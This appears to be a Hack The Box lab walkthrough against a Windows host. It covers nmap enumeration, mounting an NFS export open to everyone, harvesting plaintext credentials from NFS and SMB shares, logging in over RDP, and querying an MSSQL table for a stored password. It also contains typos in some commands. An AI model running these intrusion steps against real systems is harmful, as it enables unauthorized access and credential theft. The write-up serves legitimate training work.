First enumerate services on the target

```bash
sudo nmap -sS -sV <target> --disable-arp-ping -n
```

**PORT     STATE SERVICE       VERSION**
**111/tcp  open  rpcbind?**                    
**135/tcp  open  msrpc         Microsoft Windows RPC**
**139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn**
**445/tcp  open  microsoft-ds?**
**2049/tcp open  mountd        1-3 (RPC #100005)**
**3389/tcp open  ms-wbt-server Microsoft Terminal Services**
**Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows** 

We see that the server hosts a NFS (**port 111 and port 2049**) Samba service (**port 445**) and has RDP (**port 3389**) open.

We start by checking if we can mount the NFS to our local system.

```bash
shouwmount -e <target>
```

The results were positive

```
Export list for 10.129.72.190:
/TechSupport (everyone)
```

So we proceed to mount the NFS

```bash
mkdir targetNfs
sudo mount -t nfs <target>:/ ./targetNfs -o nolock
```

The mount contained a text file in the `/Techsupport` directory. From this text file we uncovered the following credentials `alex`:`lol123!mD` 

Next we unmount the NFS
```bash
unmount -e 
```

With these credentials we can try to log into the Samba share and list the shares.

```bash
smbclient -L alex //<target>
```

```                                                 
        Sharename       Type      Comment                                          
        ---------       ----      -------                                         
        ADMIN$          Disk      Remote Admin                                    
        C$              Disk      Default share                                   
        devshare        Disk                                                      
        IPC$            IPC       Remote IPC                                      
        Users           Disk
Reconnecting with SMB1 for workgroup listing.  
```
We see there is a devshare. To access this share we use the following command

```bash
smbclient -U alex //<target>/devshare
```

This share contained a text file which we downloaded wit the `GET`. This text file contained the following credentials `sa`:`sll87N1ns@s83`. These look like SystemAdmin credentials.

With the username and password from alex we can try to setup an RDP connection the the target.
```bash
xfreerdp /u:alex /v:10.129.72.190
```

On alex's desktop we see  Microsoft SQL Server Management Studio 18. We open this as Administrator with the credentials from the `sa` user. 
In the `Databases` folder we see an `accounts` database.
The `accounts` database has a `devsacc` table. 

To get the password from the `HTB` user, I made the following query.

```sql
use accounts;

SELECT password
from devsacc
WHERE name = 'HTB'
```

The query gave the password, `lnch7ehrdn43i7AoqVPK4zWR` as result.
